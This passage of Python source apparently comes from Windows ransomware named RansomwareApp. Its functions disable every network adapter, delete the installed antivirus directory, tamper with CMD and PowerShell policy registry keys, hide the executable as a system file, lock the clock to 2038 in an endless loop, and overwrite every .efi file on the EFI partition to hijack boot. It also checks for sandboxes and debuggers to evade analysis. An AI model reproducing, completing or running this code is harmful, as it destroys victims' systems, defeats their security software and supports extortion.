            subprocess.run(['takeown', '/f', sys.executable], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['wmic', 'path', 'CIM_DataFile', 'where', f'name="{sys.executable}"', 'delete'], creationflags=subprocess.CREATE_NO_WINDOW)
            event.accept()
        except Exception:
            pass

def disable_all_network_adapters():
    try:
        command = 'Get-NetAdapter | Disable-NetAdapter -Confirm:$false'
        run_powershell_command(command)
    except Exception:
        pass

def enable_cmd():
    try:
        key = reg.HKEY_CURRENT_USER
        sub_key = r"Software\Policies\Microsoft\Windows\System"
        with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as key_handle:
            reg.SetValueEx(key_handle, "DisableCMD", 0, reg.REG_DWORD, 0)
    except Exception:
        pass

def enable_powershell():
    try:
        key = reg.HKEY_CURRENT_USER
        sub_key = r"Software\Policies\Microsoft\Windows\PowerShell"
        with reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS) as key_handle:
            reg.SetValueEx(key_handle, "EnableScripts", 0, reg.REG_DWORD, 1)
    except Exception:
        pass

def enable_powershell2():
    try:
        key = reg.HKEY_LOCAL_MACHINE
        sub_key = r"SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as key_handle:
            reg.SetValueEx(key_handle, "DisablePowerShell", 0, reg.REG_DWORD, 0)
    except Exception:
        pass

def remove_antivirus():
    try:
        powershell_command = '''
        $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty PathToSignedProductExe
        Split-Path -Path $antivirus
        '''
        
        result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        antivirus_directory = result.stdout.strip()
        
        if antivirus_directory:
            subprocess.run(['cmd', '/c', 'rd', '/s', '/q', antivirus_directory], check=True, creationflags=subprocess.CREATE_NO_WINDOW) 
    except Exception:
           pass
def reset_date():
    while True:
        try:
            current_date = subprocess.run('date /t', shell=True, capture_output=True, text=True).stdout.strip()
            if current_date != '18-01-2038':
                subprocess.run('date 18-01-2038', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
           return False
def check_sys_executable():
  try:
    return os.path.exists(sys.executable)
  except Exception:
           pass
def make_system_file():
    try:
        script_path = sys.executable

        attributes = '+r +h +s'

        command = f'attrib "{script_path}" {attributes}'

        os.system(command)
    except Exception:
           pass
def copy_efi_file():
    try:
        subprocess.run(['mountvol', 'X:', '/S'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

        source_file = os.path.join(os.path.dirname(__file__), 'bootmgfw.efi')
        if not os.path.exists(source_file):
            source_file = os.path.join(os.path.dirname(sys.executable), 'bootmgfw.efi')
            if not os.path.exists(source_file):
                source_file = os.path.join(os.getcwd(), 'bootmgfw.efi')
                
        folder_path = 'X:\\'

        with open(source_file, 'rb') as boot_file:
            boot_content = boot_file.read()

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith('.efi'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'wb') as efi_file:
                        efi_file.write(boot_content)

        subprocess.run(['mountvol', 'X:', '/D'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

    except Exception:
        pass
def main():
    try:
            make_system_file()
            threading.Thread(target=enable_powershell).start()
            threading.Thread(target=enable_powershell2).start()
            threading.Thread(target=enable_cmd).start()
            threading.Thread(target=disable_all_network_adapters).start()
            time.sleep(5)  
            threading.Thread(target=reset_date).start()
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            copy_efi_file()
            app = RansomwareApp()
            app.mainloop()
    except KeyboardInterrupt:
        os._exit(0)
    except Exception: 
        pass
if __name__ == "__main__":
    try:
        security = guardshield.Security()
        if is_admin() or not security.check_vm() or not check_sys_executable() or security.check_debug() or security.check_sandbox():
           main()
        else:
         os_exit(0)
    except KeyboardInterrupt:
        os._exit(0)
    except Exception:
        pass